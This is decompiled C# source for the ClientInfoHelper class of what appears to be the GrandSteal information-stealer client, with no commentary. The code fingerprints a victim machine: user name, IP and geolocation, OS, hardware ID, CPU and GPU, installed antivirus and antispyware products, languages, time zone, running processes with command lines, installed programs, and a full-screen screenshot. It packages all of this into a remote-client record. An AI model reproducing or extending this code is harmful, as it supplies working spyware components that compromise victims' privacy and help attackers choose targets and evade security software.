using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Windows.Forms;
using GrandSteal.Client.Models.Extensions.Nulls;
using GrandSteal.SharedModels.Models;
using Microsoft.Win32;
using WMIGatherer.Gathering;
using WMIGatherer.Objects;

namespace GrandSteal.Client.Models
{
	// Token: 0x02000008 RID: 8
	public static class ClientInfoHelper
	{
		// Token: 0x06000014 RID: 20 RVA: 0x000026D8 File Offset: 0x000008D8
		public static RemoteClientInformation Create(string SourceID)
		{
			RemoteClientInformation result;
			try
			{
				GeoLocationHelper.Initialize();
				Size screenSize = ClientInfoHelper.GetScreenSize();
				string text = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
				if (!text.StartsWith("-"))
				{
					text = "+" + text;
				}
				result = new RemoteClientInformation
				{
					ID = 0,
					LogTime = DateTime.Now,
					SourceID = SourceID,
					UserName = Environment.UserName,
					ClientIP = GeoLocationHelper.GeoInfo.Query,
					Country = GeoLocationHelper.GeoInfo.CountryCode,
					OperationSystem = ClientInfoHelper.ParseOS(),
					HardwareID = ClientInfoHelper.ParseHWID(),
					Hardwares = ClientInfoHelper.ParseHardwares(),
					Antiviruses = ClientInfoHelper.ParseDefenders(),
					Languages = ClientInfoHelper.AvailableLanguages(),
					CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
					MonitorSize = string.Format("{0}x{1}", screenSize.Width, screenSize.Height),
					TimeZone = "UTC" + text,
					City = GeoLocationHelper.GeoInfo.City
				};
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x0000282C File Offset: 0x00000A2C
		public static List<RemoteProcess> ListOfProcesses()
		{
			List<RemoteProcess> list = new List<RemoteProcess>();
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process Where SessionId='{0}'", Process.GetCurrentProcess().SessionId)))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								ManagementObject managementObject = (ManagementObject)enumerator.Current;
								try
								{
									RemoteProcess expr_4B = new RemoteProcess();
									object expr_58 = managementObject["ProcessId"];
									expr_4B.ProcessID = Convert.ToInt32((expr_58 != null) ? expr_58.ToString() : null);
									object expr_7B = managementObject["CommandLine"];
									expr_4B.ProcessCommandLine = ((expr_7B != null) ? expr_7B.ToString() : null);
									object expr_99 = managementObject["Name"];
									expr_4B.ProcessName = ((expr_99 != null) ? expr_99.ToString() : null);
									expr_4B.ProcessUsername = Environment.MachineName + "\\" + Environment.UserName;
									RemoteProcess item = expr_4B;
									list.Add(item);
								}
								catch (Exception arg_D0_0)
								{
									Console.WriteLine(arg_D0_0);
								}
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000029C4 File Offset: 0x00000BC4
		public static List<string> ListOfPrograms()
		{
			List<string> list = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
				{
					string[] subKeyNames = registryKey.GetSubKeyNames();
					for (int i = 0; i < subKeyNames.Length; i++)
					{
						string name = subKeyNames[i];
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue("DisplayName") : null);
							if (!string.IsNullOrEmpty(text))
							{
								list.Add(text);
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002A80 File Offset: 0x00000C80
		public static List<string> AvailableLanguages()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (InputLanguage inputLanguage in InputLanguage.InstalledInputLanguages)
				{
					list.Add(inputLanguage.Culture.EnglishName);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002AFC File Offset: 0x00000CFC
		public static string GetCommandLine(Process process)
		{
			string result;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							object expr_43 = enumerator.Current["CommandLine"];
							result = ((expr_43 != null) ? expr_43.ToString() : null);
							return result;
						}
					}
					result = "";
				}
			}
			return result;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002BAC File Offset: 0x00000DAC
		private static List<Hardware> ParseHardwares()
		{
			List<Hardware> list = new List<Hardware>();
			try
			{
				foreach (Processor current in HardwareGatherer.GetProcessors())
				{
					list.Add(new Hardware
					{
						Caption = current.get_Name(),
						Parameter = current.get_NumberOfCores().ToString(),
						HardType = HardwareType.Processor
					});
				}
				foreach (GraphicsCard current2 in HardwareGatherer.GetGraphicsCards())
				{
					list.Add(new Hardware
					{
						Caption = current2.get_Name(),
						Parameter = current2.get_MemoryCapacity().ToString(),
						HardType = HardwareType.Graphic
					});
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002CB8 File Offset: 0x00000EB8
		private static string ParseOS()
		{
			string result;
			try
			{
				result = OsGatherer.GetCaption() + " " + OsGatherer.GetOSArchitecture();
			}
			catch
			{
				result = "UNKNOWN";
			}
			return result;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002CF8 File Offset: 0x00000EF8
		private static string ParseHWID()
		{
			string result;
			try
			{
				result = HardwareGatherer.GetHwid(2, true);
			}
			catch
			{
				result = "UNKNOWN";
			}
			return result;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002062 File Offset: 0x00000262
		public static byte[] CaptureScreen()
		{
			return ClientInfoHelper.ImageToByte(ClientInfoHelper.GetScreenshot());
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002D2C File Offset: 0x00000F2C
		private static Bitmap GetScreenshot()
		{
			Bitmap result;
			try
			{
				Size screenSize = ClientInfoHelper.GetScreenSize();
				Bitmap bitmap = new Bitmap(screenSize.Width, screenSize.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.InterpolationMode = InterpolationMode.Bicubic;
					graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
					graphics.SmoothingMode = SmoothingMode.HighSpeed;
					graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), screenSize);
				}
				result = bitmap;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002DB8 File Offset: 0x00000FB8
		private static byte[] ImageToByte(Image img)
		{
			byte[] result;
			try
			{
				if (img != null)
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						img.Save(memoryStream, ImageFormat.Png);
						result = memoryStream.ToArray();
						return result;
					}
				}
				result = null;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002E14 File Offset: 0x00001014
		private static Size GetScreenSize()
		{
			return Screen.PrimaryScreen.Bounds.Size;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002E34 File Offset: 0x00001034
		public static List<string> ParseDefenders()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(ClientInfoHelper.ParseAntiViruses().IsNull(new List<string>()));
				foreach (string current in ClientInfoHelper.ParseSpyWares().IsNull(new List<string>()))
				{
					if (!list.Contains(current))
					{
						list.Add(current);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002EC4 File Offset: 0x000010C4
		public static IEnumerable<string> ParseAntiViruses()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct current in SecurityGatherer.GetSecurityProducts(0))
				{
					list.Add(current.get_Name());
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002F30 File Offset: 0x00001130
		private static IEnumerable<string> ParseSpyWares()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct current in SecurityGatherer.GetSecurityProducts(1))
				{
					list.Add(current.get_Name());
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002F9C File Offset: 0x0000119C
		private static void ReciveOwner(int processId, out string user, out string domain)
		{
			user = "NoUser";
			domain = "NoDomain";
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new ObjectQuery("Select * from Win32_Process Where ProcessID = '" + processId + "'"));
				if (managementObjectSearcher.Get().Count == 1)
				{
					ManagementObject managementObject = null;
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							managementObject = (ManagementObject)enumerator.Current;
						}
					}
					string[] array = new string[2];
					ManagementObject arg_7E_0 = managementObject;
					string arg_7E_1 = "GetOwner";
					object[] args = array;
					arg_7E_0.InvokeMethod(arg_7E_1, args);
					if (user != null)
					{
						user = array[0];
					}
					if (domain != null)
					{
						domain = array[1];
					}
				}
			}
			catch
			{
			}
		}
	}
}
